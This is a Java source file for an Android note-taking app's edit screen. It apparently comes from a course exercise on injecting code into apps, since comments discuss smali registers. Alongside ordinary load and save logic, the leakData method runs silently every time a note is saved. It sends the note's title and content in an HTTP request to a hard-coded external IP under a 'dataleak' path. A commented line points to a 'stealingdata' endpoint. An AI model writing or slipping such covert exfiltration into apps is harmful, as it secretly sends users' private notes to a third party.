package de.up.cs.mapawo.ms.memonemo;

import android.content.Intent;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.MessageFormat;
import java.util.HashMap;
import java.util.Map;

import javax.net.ssl.HttpsURLConnection;

public class EditActivity extends AppCompatActivity {

    String filename;
    String action;
    TextView titleView;
    TextView contentView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_edit);
        Intent opener = getIntent();
        titleView=(TextView) findViewById(R.id.title);
        contentView=(TextView) findViewById(R.id.content);
        filename = ((Intent) opener).getStringExtra("filename");
        action = ((Intent) opener).getStringExtra("action");
        loadNote();
//        FloatingActionButton fab = findViewById(R.id.fab);
//        fab.setOnClickListener(new View.OnClickListener() {
//            @Override//           public void onClick(View view) {
//                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
//                        .setAction("Action", null).show();
//            }
//        });
    }

    @Override
    protected void onPause() {

        super.onPause();
        try {
            saveNote();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onShareButton() {
        Intent newIntent = new Intent(this, SendActivity.class);

        newIntent.putExtra("title", titleView.getText().toString());
        newIntent.putExtra("text", contentView.getText().toString());
        startActivity(newIntent);
    }
    public void loadNote() {

        if (fileExists()){

            BufferedReader in = null;
        try {
            in = new BufferedReader(new InputStreamReader(openFileInput(filename)));
            titleView.setText(in.readLine());
            String line;
            StringBuilder buffer = new StringBuilder();
            while ((line = in.readLine()) != null) {
                buffer.append(line).append('\n');
            }
            buffer.deleteCharAt(buffer.length() - 1);
            contentView.setText(buffer);
        } catch (Exception e) {
            Toast.makeText(this, "Exception: " + e.toString(), Toast.LENGTH_LONG).show();
        } finally {
            closeStream(in);
        }
    }}

    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // Ignore
            }
        }
    }

    private void leakData(final String title, final String content) throws Exception {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try  {

//                    String url = "http://81.169.219.191:8080/messenger/api/stealingdata?data=" + title + "," + content;
                    String url = MessageFormat.format("http://81.169.219.191:3000/dataleak?title={0}&content={1}", title, content);
                    URL obj = new URL(url);

                    //  The default method is GET.
                    /*
                    The connect() / openConnection() method just creates a connection. You have to commit the request
                    (by calling getInputStream(), getResponseCode(), or getResponseMessage()) for the response to be returned and processed.
                     */
                    HttpURLConnection con = (HttpURLConnection) obj.openConnection();

                    // the connection (GET request) isn't actually made until one getInputStream(), getResponseCode(), or getResponseMessage() is called
                    con.getResponseCode();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }

    public void saveNote() throws Exception {
        // both the original and modified versions have 6 registers because the modification does not introduce new variables.
        // it only uses already existing variables 'title' and 'content'
        Log.e("test", "inside SaveNote()");

        OutputStreamWriter out = null;

        // :try_start_0
        try {
            //    ### Reads field 'titleView' into v1  (entry #2 in the field id table). The instance is referenced by p0 (p0 = 'this' in this example).
            //    iget-object v1, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->titleView:Landroid/widget/TextView;
            //    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence; ### invoke-virtual { parameters }, methodtocall, v1 is 'this' instance
            //    move-result-object v1 ### Move the result object reference of the previous method invocation into v1.
            //    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String; ### invoke-interface { parameters }, methodtocall, v1 is 'this' instance
            //    move-result-object v1 ### Move the result object reference of the previous method invocation into v1.
            String title = titleView.getText().toString();
            String content = contentView.getText().toString();
            leakData(title, content);
            if(!title.isEmpty()) {
                out = new OutputStreamWriter(openFileOutput(filename, 0));
                out.write(title+"\n"+content);
                Toast.makeText(getApplicationContext(), getString(R.string.savednote), Toast.LENGTH_SHORT).show();
            }
            else {
                Toast.makeText(getApplicationContext(), getString(R.string.notsavednote), Toast.LENGTH_SHORT).show();
            }
        } catch (Throwable t) {
            Toast.makeText(this, "Exception: " + t.toString(), Toast.LENGTH_LONG).show();
        }
        finally {
            closeStream(out);
        }
    }

    public boolean fileExists(){
        File file = getBaseContext().getFileStreamPath(filename);
        return file.exists();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_edit, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.dbg_share) {
            onShareButton();
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

}
